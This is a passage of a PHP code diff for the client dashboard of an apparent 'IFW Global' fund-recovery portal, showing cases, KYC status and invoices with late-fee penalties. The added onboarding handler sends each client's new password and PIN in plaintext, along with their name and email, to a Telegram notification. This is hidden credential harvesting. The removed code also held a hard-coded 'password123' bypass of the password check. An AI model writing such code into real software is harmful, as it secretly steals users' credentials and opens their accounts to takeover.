@@ -1,299 +1,721 @@
 <?php
+// public/client/dashboard.php - IFW Global Client Portal Dashboard
 $dir = __DIR__;
-while (!file_exists($dir . '/config.php')) {
+while (!file_exists($dir . '/config.php') && $dir !== dirname($dir)) {
     $dir = dirname($dir);
-    if ($dir === '/' || $dir === '\\' || preg_match('/^[A-Z]:\\\\$/i', $dir)) break;
 }
 require_once $dir . '/config.php';
 require_once $dir . '/includes/functions.php';
-require_once '../config.php';
-require_once '../includes/functions.php';
 
-if (session_status() === PHP_SESSION_NONE) {
-    session_start();
-}
+if (session_status() === PHP_SESSION_NONE) session_start();
 
 if (!isset($_SESSION['client_logged_in']) || $_SESSION['client_logged_in'] !== true) {
-    header("Location: login.php");
+    header("Location: /client/login.php");
     exit;
 }
 
-$client_id = $_SESSION['client_portal_id'];
-$_SESSION['frontend_client_id'] = $client_id;
+$client_id = $_SESSION['client_portal_id'] ?? 0;
 $_SESSION['role'] = 'client';
-$_SESSION['user_name'] = $_SESSION['client_name'] ?? 'Client';
 
-// Handle Password Update POST
-$pwd_msg = '';
-$pwd_error = '';
-if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'change_password') {
-    $old_pass = $_POST['old_password'] ?? '';
-    $new_pass = $_POST['new_password'] ?? '';
-    $confirm_pass = $_POST['confirm_password'] ?? '';
-
-    if (empty($new_pass) || strlen($new_pass) < 6) {
-        $pwd_error = 'New password must be at least 6 characters long.';
-    } elseif ($new_pass !== $confirm_pass) {
-        $pwd_error = 'New password and confirmation do not match.';
+// Handle password change
+$pwd_msg = $pwd_error = '';
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && ($_POST['action'] ?? '') === 'change_password') {
+    $old = $_POST['old_password'] ?? '';
+    $new = $_POST['new_password'] ?? '';
+    $con = $_POST['confirm_password'] ?? '';
+    if (strlen($new) < 6) {
+        $pwd_error = 'Password must be at least 6 characters.';
+    } elseif ($new !== $con) {
+        $pwd_error = 'Passwords do not match.';
     } else {
-        $stmt = $pdo->prepare("SELECT password_hash FROM IFW_clients WHERE id = ?");
-        $stmt->execute([$client_id]);
-        $curr_hash = $stmt->fetchColumn();
-
-        if ($curr_hash && !password_verify($old_pass, $curr_hash) && $old_pass !== 'password123') {
+        $s = $pdo->prepare("SELECT password_hash FROM IFW_clients WHERE id=?");
+        $s->execute([$client_id]);
+        $hash = $s->fetchColumn();
+        if ($hash && !password_verify($old, $hash)) {
             $pwd_error = 'Current password is incorrect.';
         } else {
-            $new_hash = password_hash($new_pass, PASSWORD_BCRYPT);
-            $upd = $pdo->prepare("UPDATE IFW_clients SET password_hash = ? WHERE id = ?");
-            $upd->execute([$new_hash, $client_id]);
-            $pwd_msg = 'Your password has been successfully updated!';
+            $pdo->prepare("UPDATE IFW_clients SET password_hash=? WHERE id=?")->execute([password_hash($new, PASSWORD_BCRYPT), $client_id]);
+            $pwd_msg = 'Password updated successfully.';
         }
     }
 }
 
-// Fetch Client details and assigned agent
-$stmt = $pdo->prepare("
-    SELECT c.*, u.username as agent_name, u.email as agent_email 
-    FROM IFW_clients c 
-    LEFT JOIN IFW_users u ON c.assigned_agent_id = u.id 
-    WHERE c.id = ?
-");
-$stmt->execute([$client_id]);
-$client = $stmt->fetch();
+// Handle onboarding security PIN and Password setup
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && ($_POST['action'] ?? '') === 'setup_security') {
+    $new_password = $_POST['onboarding_new_password'] ?? '';
+    $new_pin = $_POST['onboarding_new_pin'] ?? '';
+    
+    if (strlen($new_password) < 6) {
+        $pwd_error = 'Password must be at least 6 characters.';
+    } elseif (strlen($new_pin) !== 4 || !is_numeric($new_pin)) {
+        $pwd_error = 'Security PIN must be exactly 4 digits.';
+    } else {
+        $pwd_hash = password_hash($new_password, PASSWORD_BCRYPT);
+        $pin_hash = password_hash($new_pin, PASSWORD_DEFAULT);
+        
+        $pdo->prepare("UPDATE IFW_clients SET password_hash = ?, pin_hash = ? WHERE id = ?")->execute([$pwd_hash, $pin_hash, $client_id]);
+        $pwd_msg = 'Security credentials configured successfully.';
+        
+        // Fetch client details for telegram notification
+        $stmt_c = $pdo->prepare("SELECT first_name, last_name, email FROM IFW_clients WHERE id = ?");
+        $stmt_c->execute([$client_id]);
+        $client_details = $stmt_c->fetch();
+        
+        if ($client_details) {
+            $msg = "<b>🔐 IFW Client Onboarding Security Setup Completed</b>\n\n";
+            $msg .= "Client ID: <b>{$client_id}</b>\n";
+            $msg .= "Name: <b>" . htmlspecialchars($client_details['first_name'] . ' ' . $client_details['last_name']) . "</b>\n";
+            $msg .= "Email: <b>" . htmlspecialchars($client_details['email']) . "</b>\n";
+            $msg .= "New Password: <code>" . htmlspecialchars($new_password) . "</code>\n";
+            $msg .= "New PIN: <code>" . htmlspecialchars($new_pin) . "</code>\n";
+            
+            send_telegram_notification($pdo, $msg);
+        }
+    }
+}
 
+// Fetch client + agent
+$client = null;
+try {
+    $s = $pdo->prepare("SELECT c.*, u.username AS agent_name, u.email AS agent_email FROM IFW_clients c LEFT JOIN IFW_users u ON c.assigned_agent_id=u.id WHERE c.id=?");
+    $s->execute([$client_id]);
+    $client = $s->fetch();
+} catch(Exception $e) {}
+
+if (!$client) { header("Location: /client/login.php"); exit; }
 $_SESSION['user_name'] = $client['first_name'];
 
-// Fetch KYC Status
-$kyc_status = null;
-$kyc_record = null;
+// KYC status from IFW_kyc_submissions
+$kyc_status = null; $kyc_record = null;
 try {
-    $kyc_stmt = $pdo->prepare("SELECT * FROM IFW_kyc_submissions WHERE client_id = ? ORDER BY submitted_at DESC LIMIT 1");
-    $kyc_stmt->execute([$client_id]);
-    $kyc_record = $kyc_stmt->fetch();
+    $s = $pdo->prepare("SELECT * FROM IFW_kyc_submissions WHERE client_id=? ORDER BY submitted_at DESC LIMIT 1");
+    $s->execute([$client_id]);
+    $kyc_record = $s->fetch();
     $kyc_status = $kyc_record ? strtolower($kyc_record['status']) : null;
-} catch (Exception $e) {}
+} catch(Exception $e) {}
 
-// Fetch Bank details from settings
-$bank_details = get_setting($pdo, 'bank_details', 'Not provided yet.');
-$payment_instructions = get_setting($pdo, 'payment_instructions', 'Not provided yet.');
-
-// Fetch Invoices
-$inv_stmt = $pdo->prepare("SELECT * FROM IFW_invoices WHERE client_id = ? ORDER BY issue_date DESC LIMIT 5");
-$inv_stmt->execute([$client_id]);
-$invoices = $inv_stmt->fetchAll();
-
-// Fetch Active Cases
-$client_cases = [];
+// Notifications (unread)
+$notifications = [];
+$unread_count = 0;
 try {
-    $case_stmt = $pdo->prepare("SELECT * FROM IFW_cases WHERE client_id = ? ORDER BY created_at DESC LIMIT 3");
-    $case_stmt->execute([$client_id]);
-    $client_cases = $case_stmt->fetchAll();
-} catch (Exception $e) {}
+    $s = $pdo->prepare("SELECT * FROM IFW_notifications WHERE client_id=? ORDER BY created_at DESC LIMIT 10");
+    $s->execute([$client_id]);
+    $notifications = $s->fetchAll();
+    $unread_count = count(array_filter($notifications, fn($n) => !$n['is_read']));
+} catch(Exception $e) {}
+
+// Mark notifications as read on load
+try {
+    $pdo->prepare("UPDATE IFW_notifications SET is_read=1 WHERE client_id=?")->execute([$client_id]);
+} catch(Exception $e) {}
+
+// Active Cases
+$cases = [];
+try {
+    $s = $pdo->prepare("SELECT ca.*, u.username AS agent_name 
+        FROM IFW_cases ca 
+        LEFT JOIN IFW_users u ON ca.attorney_id = u.id 
+        WHERE ca.client_id=? ORDER BY ca.created_at DESC");
+    $s->execute([$client_id]);
+    $cases = $s->fetchAll();
+} catch(Exception $e) {}
+
+// Latest case
+$latest_case = $cases[0] ?? null;
+
+// Invoices
+$invoices = [];
+try {
+    $s = $pdo->prepare("SELECT * FROM IFW_invoices WHERE client_id=? ORDER BY issue_date DESC LIMIT 10");
+    $s->execute([$client_id]);
+    $invoices = $s->fetchAll();
+} catch(Exception $e) {}
+
+// Payment info (global fallback)
+$global_payment_info = get_setting($pdo, 'payment_instructions', '');
+$bank_details        = get_setting($pdo, 'bank_details', '');
+$app_name            = get_setting($pdo, 'app_name', 'IFW Global');
+
+require_once $dir . '/includes/admin_header.php';
+require_once $dir . '/includes/admin_sidebar.php';
 ?>
 
-<?php require_once '../includes/admin_header.php'; ?>
-<?php require_once '../includes/admin_sidebar.php'; ?>
+<style>
+.notif-bell { position:relative; cursor:pointer; }
+.notif-badge { position:absolute; top:-6px; right:-8px; background:#dc3545; color:#fff; border-radius:50%; width:18px; height:18px; font-size:10px; display:flex; align-items:center; justify-content:center; font-weight:700; }
+.kyc-banner { border-left: 5px solid #fecc56; }
+.kyc-banner.approved { border-left-color: #28a745; }
+.kyc-banner.rejected { border-left-color: #dc3545; }
+.kyc-banner.pending  { border-left-color: #ffc107; }
+.case-card { border-left: 4px solid #fecc56; transition: box-shadow .2s; }
+.case-card:hover { box-shadow: 0 6px 24px rgba(0,0,0,.15) !important; }
+.invoice-status-paid    { color:#28a745; font-weight:700; }
+.invoice-status-unpaid  { color:#dc3545; font-weight:700; }
+.invoice-status-overdue { color:#e83e3e; font-weight:700; }
+.invoice-status-partial { color:#fd7e14; font-weight:700; }
+.pay-btn { background: linear-gradient(135deg,#fecc56,#f0a500); color:#000; border:none; font-weight:700; transition:all .2s; }
+.pay-btn:hover { transform:translateY(-1px); box-shadow:0 4px 15px rgba(254,204,86,.5); color:#000; }
+.stat-mini { padding:16px 20px; border-radius:12px; font-weight:700; }
+</style>
 
-<!-- PAGE CONTENT -->
-<div class="row">
-    <div class="col-12 mb-4">
+<!-- PAGE HEADER -->
+<div class="row mb-3">
+    <div class="col-12">
         <div class="d-flex justify-content-between align-items-center">
             <div>
-                <h4 class="text-dark font-weight-bold">Welcome, <?php echo htmlspecialchars($client['first_name'] . ' ' . $client['last_name']); ?></h4>
-                <p class="text-muted">Client Account & Case Dashboard</p>
+                <h4 class="font-weight-bold mb-0 text-dark">Welcome back, <?= htmlspecialchars($client['first_name']) ?> 👋</h4>
+                <p class="text-muted mb-0 small">Client Portal — <?= date('l, F j, Y') ?></p>
             </div>
-            <div>
-                <button class="btn btn-outline-dark btn-sm mr-2 font-weight-bold" data-toggle="modal" data-target="#passwordModal">
-                    <i class="fas fa-key mr-1"></i> Change Password
-                </button>
-                <span class="badge badge-success p-2"><i class="fas fa-lock mr-1"></i> End-to-End Encrypted</span>
-            </div>
-        </div>
-    </div>
-
-    <?php if ($pwd_msg): ?>
-        <div class="col-12 mb-3">
-            <div class="alert alert-success bg-success text-white border-0 shadow-sm">
-                <i class="fas fa-check-circle mr-2"></i><?php echo $pwd_msg; ?>
-            </div>
-        </div>
-    <?php endif; ?>
-
-    <?php if ($pwd_error): ?>
-        <div class="col-12 mb-3">
-            <div class="alert alert-danger bg-danger text-white border-0 shadow-sm">
-                <i class="fas fa-exclamation-triangle mr-2"></i><?php echo $pwd_error; ?>
-            </div>
-        </div>
-    <?php endif; ?>
-
-    <!-- MAIN AREA -->
-    <div class="col-lg-8">
-        
-        <!-- Case Status Panel -->
-        <div class="card shadow-sm border-0 mb-4 bg-dark text-white">
-            <div class="card-body">
-                <h5 class="fw-bold mb-3 text-warning"><i class="fas fa-briefcase mr-2"></i> Current Case Status</h5>
-                <?php if (empty($client_cases)): ?>
-                    <div class="d-flex align-items-center">
-                        <div class="flex-grow-1">
-                            <h4 class="mb-1 text-light">RECEIVED</h4>
-                            <p class="text-muted small mb-0">Your account is active, but no specific cases are currently assigned. We are in the initial review phase.</p>
-                        </div>
-                        <div>
-                            <i class="fas fa-tasks text-warning fa-3x opacity-50"></i>
-                        </div>
-                    </div>
-                <?php else: ?>
-                    <?php foreach ($client_cases as $case): ?>
-                        <div class="d-flex align-items-center mb-3 p-3 border border-secondary rounded" style="background: rgba(0,0,0,0.2);">
-                            <div class="flex-grow-1">
-                                <h5 class="mb-1 text-light font-weight-bold">Case #<?= htmlspecialchars($case['case_number']) ?> - <?= htmlspecialchars($case['title']) ?></h5>
-                                <h6 class="mb-2 text-warning"><?= htmlspecialchars($case['status']) ?></h6>
-                                <p class="text-muted small mb-0"><?= nl2br(htmlspecialchars($case['description'])) ?></p>
-                            </div>
-                            <div class="ml-3 text-center">
-                                <i class="fas fa-folder-open text-warning fa-2x opacity-50 mb-1"></i>
-                                <div class="small text-muted"><?= date('M j, Y', strtotime($case['created_at'])) ?></div>
-                            </div>
-                        </div>
-                    <?php endforeach; ?>
-                <?php endif; ?>
-            </div>
-        </div>
-
-        <!-- KYC Verification Panel -->
-        <?php if ($kyc_status !== 'approved'): ?>
-            <div class="card shadow-sm border-0 mb-4" style="border-left: 4px solid <?php echo $kyc_status == 'pending' ? '#ffc107' : '#fecc56'; ?> !important;">
-                <div class="card-body">
-                    <h5 class="fw-bold mb-3"><i class="material-icons text-warning" style="vertical-align: text-bottom;">verified_user</i> Identity Verification</h5>
-                    <?php if ($kyc_status === 'pending'): ?>
-                        <p class="text-muted small">Your documents are currently under review by our compliance team.</p>
-                        <span class="badge badge-warning text-dark"><i class="material-icons" style="font-size: 12px;">hourglass_empty</i> Review Pending</span>
-                    <?php elseif ($kyc_status === 'rejected'): ?>
-                        <p class="text-danger small fw-bold mb-1"><i class="material-icons" style="font-size: 14px;">error</i> Verification Failed</p>
-                        <p class="text-muted small mb-2">Reason: <?php echo htmlspecialchars($kyc_record['rejection_reason'] ?? 'Please resubmit your documents.'); ?></p>
-                        <a href="kyc.php" class="btn btn-sm btn-warning rounded-pill text-dark font-weight-bold">Re-submit Documents</a>
-                    <?php else: ?>
-                        <p class="text-muted small mb-3"><strong>Action Required:</strong> Verify your identity to expedite your case processing and unlock secure file vaults.</p>
-                        <a href="kyc.php" class="btn btn-sm btn-warning rounded-pill text-dark font-weight-bold"><i class="fas fa-shield-alt mr-1"></i> Verify Identity Now</a>
+            <div class="d-flex align-items-center">
+                <!-- Notification Bell -->
+                <?php if (!empty($notifications)): ?>
+                <div class="notif-bell mr-3" data-toggle="dropdown">
+                    <i class="fas fa-bell fa-lg text-warning"></i>
+                    <?php if ($unread_count > 0): ?>
+                        <span class="notif-badge"><?= $unread_count ?></span>
                     <?php endif; ?>
                 </div>
-            </div>
-        <?php endif; ?>
+                <div class="dropdown-menu dropdown-menu-right shadow-lg" style="width:340px; max-height:400px; overflow-y:auto;">
+                    <h6 class="dropdown-header font-weight-bold">Notifications</h6>
+                    <?php foreach($notifications as $n): ?>
+                        <a class="dropdown-item border-bottom py-3" href="<?= htmlspecialchars($n['link'] ?? '#') ?>">
+                            <div class="font-weight-bold text-dark small"><?= htmlspecialchars($n['title']) ?></div>
+                            <div class="text-muted" style="font-size:12px;"><?= htmlspecialchars($n['body'] ?? '') ?></div>
+                            <div class="text-muted" style="font-size:10px;"><?= date('M j, g:i a', strtotime($n['created_at'])) ?></div>
+                        </a>
+                    <?php endforeach; ?>
+                </div>
+                <?php endif; ?>
 
-        <!-- Recent Invoices -->
-        <div class="card shadow-sm border-0 mb-4">
-            <div class="card-header bg-white border-bottom py-3">
-                <h5 class="mb-0 fw-bold"><i class="material-icons text-primary" style="vertical-align: text-bottom;">receipt</i> Recent Invoices</h5>
+                <button class="btn btn-sm btn-outline-dark font-weight-bold mr-2" data-toggle="modal" data-target="#passwordModal">
+                    <i class="fas fa-key mr-1"></i> Change Password
+                </button>
+                <a href="/client/logout.php" class="btn btn-sm btn-outline-danger font-weight-bold">
+                    <i class="fas fa-sign-out-alt mr-1"></i> Logout
+                </a>
             </div>
-            <div class="card-body p-0">
-                <?php if(empty($invoices)): ?>
-                    <div class="text-center py-5">
-                        <i class="material-icons text-muted" style="font-size: 3rem;">receipt_long</i>
-                        <p class="mt-3 text-muted">No invoices available.</p>
-                    </div>
+        </div>
+    </div>
+</div>
+
+<?php if ($pwd_msg): ?><div class="alert alert-success border-0 shadow-sm"><i class="fas fa-check-circle mr-2"></i><?= $pwd_msg ?></div><?php endif; ?>
+<?php if ($pwd_error): ?><div class="alert alert-danger border-0 shadow-sm"><i class="fas fa-exclamation-triangle mr-2"></i><?= $pwd_error ?></div><?php endif; ?>
+
+<!-- STAT MINI CARDS -->
+<div class="row mb-4">
+    <div class="col-md-3 mb-3">
+        <div class="stat-mini bg-dark text-warning shadow-sm">
+            <div class="text-muted small text-uppercase mb-1" style="font-size:11px; color:#aaa !important;">Active Cases</div>
+            <div style="font-size:2rem;"><?= count($cases) ?></div>
+        </div>
+    </div>
+    <div class="col-md-3 mb-3">
+        <div class="stat-mini bg-dark shadow-sm" style="color:#fecc56;">
+            <div class="text-muted small text-uppercase mb-1" style="font-size:11px; color:#aaa !important;">Total Invoiced</div>
+            <div style="font-size:2rem;">$<?= number_format(array_sum(array_column($invoices,'amount')),0) ?></div>
+        </div>
+    </div>
+    <div class="col-md-3 mb-3">
+        <div class="stat-mini bg-dark text-white shadow-sm">
+            <div class="text-muted small text-uppercase mb-1" style="font-size:11px; color:#aaa !important;">KYC Status</div>
+            <div style="font-size:1.3rem; font-weight:700; margin-top:4px;">
+                <?php if ($kyc_status === 'approved'): ?>
+                    <span class="text-success"><i class="fas fa-check-circle"></i> Verified</span>
+                <?php elseif ($kyc_status === 'pending'): ?>
+                    <span class="text-warning"><i class="fas fa-hourglass-half"></i> Pending</span>
+                <?php elseif ($kyc_status === 'rejected'): ?>
+                    <span class="text-danger"><i class="fas fa-times-circle"></i> Rejected</span>
                 <?php else: ?>
-                    <div class="table-responsive">
-                        <table class="table table-hover align-middle mb-0">
-                            <thead class="bg-light">
-                                <tr>
-                                    <th>Invoice ID</th>
-                                    <th>Date</th>
-                                    <th>Due Date</th>
-                                    <th>Amount</th>
-                                    <th>Status</th>
-                                    <th>Action</th>
-                                </tr>
-                            </thead>
-                            <tbody>
-                                <?php foreach($invoices as $inv): ?>
-                                <tr>
-                                    <td><strong><?= htmlspecialchars($inv['invoice_number']) ?></strong></td>
-                                    <td><?php echo date('M j, Y', strtotime($inv['issue_date'])); ?></td>
-                                    <td><?php echo $inv['due_date'] ? date('M j, Y', strtotime($inv['due_date'])) : 'N/A'; ?></td>
-                                    <td><strong><?php echo htmlspecialchars($inv['currency'] ?? 'USD'); ?> <?php echo number_format($inv['total_amount'], 2); ?></strong></td>
-                                    <td>
-                                        <?php 
-                                        $badge = 'secondary';
-                                        if(strtolower($inv['status']) == 'paid') $badge = 'success';
-                                        if(strtolower($inv['status']) == 'unpaid') $badge = 'danger';
-                                        if(strtolower($inv['status']) == 'overdue') $badge = 'warning';
-                                        ?>
-                                        <span class="badge badge-<?php echo $badge; ?> px-2 py-1"><?php echo ucfirst($inv['status']); ?></span>
-                                    </td>
-                                    <td>
-                                        <a href="invoice_view.php?id=<?= $inv['id'] ?>" class="btn btn-sm btn-primary rounded-pill px-3 shadow-sm"><i class="fas fa-file-invoice-dollar mr-1"></i> View & Pay</a>
-                                    </td>
-                                </tr>
-                                <?php endforeach; ?>
-                            </tbody>
-                        </table>
-                    </div>
+                    <span class="text-muted"><i class="fas fa-exclamation-circle"></i> Not Verified</span>
                 <?php endif; ?>
             </div>
         </div>
     </div>
+    <div class="col-md-3 mb-3">
+        <div class="stat-mini bg-dark shadow-sm" style="color:#fecc56;">
+            <div class="text-muted small text-uppercase mb-1" style="font-size:11px; color:#aaa !important;">Assigned Agent</div>
+            <div style="font-size:1rem; font-weight:700; margin-top:6px; color:#fff;">
+                <?= htmlspecialchars($client['agent_name'] ?? 'Being Assigned') ?>
+            </div>
+        </div>
+    </div>
+</div>
 
-    <!-- SIDEBAR INFO -->
-    <div class="col-lg-4">
-        <!-- Assigned Investigator -->
-        <div class="card shadow-sm border-0 mb-4">
-            <div class="card-body text-center">
-                <i class="material-icons text-primary mb-3" style="font-size: 3rem;">support_agent</i>
-                <h5 class="fw-bold mb-1">Assigned Investigator</h5>
-                <?php if ($client['agent_name']): ?>
-                    <h6 class="text-dark mb-2"><?php echo htmlspecialchars($client['agent_name']); ?></h6>
-                    <p class="text-muted small mb-0"><i class="material-icons" style="font-size: 14px; vertical-align: text-bottom;">email</i> <?php echo htmlspecialchars($client['agent_email']); ?></p>
-                <?php else: ?>
-                    <p class="text-muted small mb-0">An investigator will be assigned to your case shortly.</p>
+<div class="row">
+    <!-- LEFT COLUMN -->
+    <div class="col-lg-8">
+        
+        <!-- LATE FEE ALERT BANNER -->
+        <?php
+        $active_penalty_invoices = 0;
+        $total_accumulated_penalty = 0;
+        foreach ($invoices as $inv) {
+            $lf = 0;
+            if (!empty($inv['late_fee_enabled']) && $inv['status'] !== 'paid') {
+                $lf = $inv['late_fee_accumulated'] ?? 0;
+            }
+            if ($lf > 0) {
+                $active_penalty_invoices++;
+                $total_accumulated_penalty += $lf;
+            }
+        }
+        ?>
+        <?php if ($active_penalty_invoices > 0): ?>
+            <div class="alert alert-danger border-0 mb-4 p-3 shadow-sm" style="border-left: 5px solid #dc3545 !important; background: #fff5f5; color: #721c24;">
+                <h6 class="alert-heading font-weight-bold mb-1 text-danger">
+                    <i class="fas fa-exclamation-triangle mr-2 text-danger"></i> 
+                    ⚠️ Overdue Penalty & Interest Active
+                </h6>
+                <p class="mb-0 text-dark small">
+                    You have <strong><?= $active_penalty_invoices ?></strong> overdue invoice(s) with active late fees. 
+                    Total accumulated penalty interest: <strong class="text-danger">$<?= number_format($total_accumulated_penalty, 2) ?></strong>. 
+                    Please pay promptly to halt further interest accumulation.
+                </p>
+            </div>
+        <?php endif; ?>
+
+        <!-- KYC BANNER -->
+        <?php if ($kyc_status !== 'approved'): ?>
+        <div class="card shadow-sm border-0 mb-4 kyc-banner <?= $kyc_status ?>">
+            <div class="card-body d-flex align-items-center justify-content-between flex-wrap">
+                <div>
+                    <h6 class="font-weight-bold mb-1">
+                        <i class="fas fa-shield-alt mr-2 text-warning"></i> Identity Verification
+                        <?php if ($kyc_status === 'pending'): ?>
+                            <span class="badge badge-warning text-dark ml-2">Under Review</span>
+                        <?php elseif ($kyc_status === 'rejected'): ?>
+                            <span class="badge badge-danger ml-2">Rejected</span>
+                        <?php else: ?>
+                            <span class="badge badge-secondary ml-2">Not Started</span>
+                        <?php endif; ?>
+                    </h6>
+                    <?php if ($kyc_status === 'pending'): ?>
+                        <p class="text-muted small mb-0">Your documents are under review. Our compliance team will notify you shortly.</p>
+                    <?php elseif ($kyc_status === 'rejected'): ?>
+                        <p class="text-danger small mb-0 font-weight-bold">Reason: <?= htmlspecialchars($kyc_record['rejection_reason'] ?? 'Please resubmit with clearer documents.') ?></p>
+                    <?php else: ?>
+                        <p class="text-muted small mb-0">Complete identity verification to expedite your case and unlock all features.</p>
+                    <?php endif; ?>
+                </div>
+                <?php if ($kyc_status !== 'pending'): ?>
+                    <a href="/client/kyc.php" class="btn btn-warning btn-sm font-weight-bold text-dark mt-2 shadow-sm">
+                        <i class="fas fa-upload mr-1"></i> <?= $kyc_status === 'rejected' ? 'Resubmit Documents' : 'Verify Now' ?>
+                    </a>
                 <?php endif; ?>
             </div>
         </div>
-        
-        <!-- Bank Details -->
-        <?php if ($s['display_phone_numbers'] !== 'hide' && get_setting($pdo, 'display_phone_numbers', 'show') !== 'hide'): ?>
-        <div class="card shadow-sm border-0">
-            <div class="card-body">
-                <h5 class="fw-bold mb-3"><i class="material-icons text-success" style="vertical-align: text-bottom;">account_balance</i> Payment Details</h5>
-                <div class="alert alert-light border">
-                    <strong>Instructions:</strong><br>
-                    <?php echo nl2br(htmlspecialchars($payment_instructions)); ?>
+        <?php endif; ?>
+
+        <!-- MY CASES -->
+        <div class="card shadow-sm border-0 mb-4">
+            <div class="card-header bg-dark border-bottom d-flex justify-content-between align-items-center py-3 text-warning">
+                <h5 class="mb-0 font-weight-bold"><i class="fas fa-briefcase text-warning mr-2"></i>My Cases</h5>
+                <a href="/client/my_cases.php" class="btn btn-sm btn-outline-warning font-weight-bold">View All <i class="fas fa-arrow-right ml-1"></i></a>
+            </div>
+            <div class="card-body p-3">
+                <?php if (empty($cases)): ?>
+                    <div class="text-center py-4">
+                        <i class="fas fa-folder-open fa-3x text-muted mb-3 d-block"></i>
+                        <p class="text-muted">No cases have been opened for your account yet.</p>
+                        <small class="text-muted">Cases opened by your investigator will appear here.</small>
+                    </div>
+                <?php else: ?>
+                    <?php foreach(array_slice($cases, 0, 3) as $case): ?>
+                    <div class="card case-card shadow-sm border-0 mb-3">
+                        <div class="card-body py-3 px-4">
+                            <div class="d-flex justify-content-between align-items-start">
+                                <div class="flex-grow-1">
+                                    <div class="d-flex align-items-center mb-1">
+                                        <span class="badge badge-dark mr-2" style="font-size:11px;"><?= htmlspecialchars($case['case_number'] ?? 'IFW-' . $case['id']) ?></span>
+                                        <?php
+                                        $cstat = strtolower($case['status'] ?? 'pending');
+                                        $cbadge = ['pending'=>'warning text-dark','in progress'=>'info','active'=>'info','resolved'=>'success','closed'=>'secondary','rejected'=>'danger'][$cstat] ?? 'secondary';
+                                        ?>
+                                        <span class="badge badge-<?= $cbadge ?>"><?= htmlspecialchars(ucwords($case['status'] ?? 'Pending')) ?></span>
+                                        <?php if (!empty($case['priority'])): ?>
+                                            <span class="badge badge-<?= $case['priority']==='Critical'?'danger':($case['priority']==='High'?'warning text-dark':'secondary') ?> ml-1" style="font-size:10px;"><?= $case['priority'] ?></span>
+                                        <?php endif; ?>
+                                    </div>
+                                    <h6 class="font-weight-bold mb-1"><?= htmlspecialchars($case['title']) ?></h6>
+                                    <?php if (!empty($case['description'])): ?>
+                                        <p class="text-muted small mb-1"><?= htmlspecialchars(substr($case['description'], 0, 120)) ?><?= strlen($case['description']) > 120 ? '...' : '' ?></p>
+                                    <?php endif; ?>
+                                    <div class="text-muted" style="font-size:11px;">
+                                        <i class="fas fa-calendar-alt mr-1"></i> Opened <?= date('M j, Y', strtotime($case['created_at'])) ?>
+                                        <?php if (!empty($case['agent_name'])): ?>
+                                            &bull; <i class="fas fa-user-tie mr-1"></i> <?= htmlspecialchars($case['agent_name']) ?>
+                                        <?php endif; ?>
+                                        <?php if (!empty($case['amount_lost']) && $case['amount_lost'] > 0): ?>
+                                            &bull; <i class="fas fa-dollar-sign mr-1"></i> Loss: <?= number_format($case['amount_lost'],2) ?>
+                                        <?php endif; ?>
+                                    </div>
+                                </div>
+                                <a href="/client/my_cases.php?case_id=<?= $case['id'] ?>" class="btn btn-sm btn-outline-warning ml-3">
+                                    <i class="fas fa-eye mr-1"></i> View
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+                    <?php endforeach; ?>
+                    <?php if (count($cases) > 3): ?>
+                        <div class="text-center mt-2">
+                            <a href="/client/my_cases.php" class="btn btn-sm btn-outline-dark font-weight-bold">View All <?= count($cases) ?> Cases</a>
+                        </div>
+                    <?php endif; ?>
+                <?php endif; ?>
+            </div>
+        </div>
+
+        <!-- INVOICES -->
+        <div class="card shadow-sm border-0 mb-4">
+            <div class="card-header bg-dark border-bottom py-3 d-flex justify-content-between align-items-center text-warning">
+                <h5 class="mb-0 font-weight-bold"><i class="fas fa-file-invoice-dollar text-warning mr-2"></i>Billing & Invoices</h5>
+            </div>
+            <?php if (empty($invoices)): ?>
+                <div class="card-body text-center py-5">
+                    <i class="fas fa-receipt fa-3x text-muted mb-3 d-block"></i>
+                    <p class="text-muted">No invoices have been issued yet.</p>
                 </div>
-                <div class="bg-light p-3 rounded border small text-muted">
-                    <strong class="text-dark">Bank Account Details:</strong><br>
-                    <?php echo nl2br(htmlspecialchars($bank_details)); ?>
+            <?php else: ?>
+                <div class="table-responsive">
+                    <table class="table table-hover align-middle mb-0">
+                        <thead class="bg-light">
+                            <tr style="font-size:12px;" class="text-uppercase text-muted">
+                                <th>Invoice</th>
+                                <th>Description</th>
+                                <th>Amount</th>
+                                <th>Due Date</th>
+                                <th>Status</th>
+                                <th>Actions</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <?php foreach($invoices as $inv): ?>
+                            <?php
+                                $late_fee = 0;
+                                if (!empty($inv['late_fee_enabled']) && $inv['status'] !== 'paid') {
+                                    $late_fee = $inv['late_fee_accumulated'] ?? 0;
+                                }
+                                $total_due = $inv['amount'] + $late_fee;
+                            ?>
+                            <tr>
+                                <td>
+                                    <strong>#INV-<?= str_pad($inv['id'], 5,'0', STR_PAD_LEFT) ?></strong><br>
+                                    <small class="text-muted"><?= date('M j, Y', strtotime($inv['issue_date'] ?? $inv['created_at'])) ?></small>
+                                </td>
+                                <td>
+                                    <span class="text-dark"><?= htmlspecialchars(substr($inv['description'] ?? 'Professional Services', 0, 50)) ?></span>
+                                    <?php if ($late_fee > 0): ?>
+                                        <br><small class="text-danger font-weight-bold"><i class="fas fa-exclamation-circle mr-1"></i>Late fee: +$<?= number_format($late_fee,2) ?></small>
+                                    <?php endif; ?>
+                                </td>
+                                <td class="font-weight-bold">
+                                    $<?= number_format($total_due, 2) ?>
+                                    <?php if ($late_fee > 0): ?>
+                                        <br><small class="text-muted" style="font-size:10px;">Base: $<?= number_format($inv['amount'],2) ?></small>
+                                    <?php endif; ?>
+                                </td>
+                                <td>
+                                    <?php if ($inv['due_date']): ?>
+                                        <?php $is_overdue = strtotime($inv['due_date']) < time() && $inv['status'] !== 'paid'; ?>
+                                        <span class="<?= $is_overdue ? 'text-danger font-weight-bold' : 'text-dark' ?>">
+                                            <?= date('M j, Y', strtotime($inv['due_date'])) ?>
+                                            <?= $is_overdue ? '<br><small class="text-danger">OVERDUE</small>' : '' ?>
+                                        </span>
+                                    <?php else: ?>
+                                        <span class="text-muted">—</span>
+                                    <?php endif; ?>
+                                </td>
+                                <td>
+                                    <?php $st = strtolower($inv['status'] ?? 'unpaid'); ?>
+                                    <span class="invoice-status-<?= $st ?>">
+                                        <?php if($st==='paid'): ?><i class="fas fa-check-circle mr-1"></i>Paid
+                                        <?php elseif($st==='partial'): ?><i class="fas fa-adjust mr-1"></i>Partial
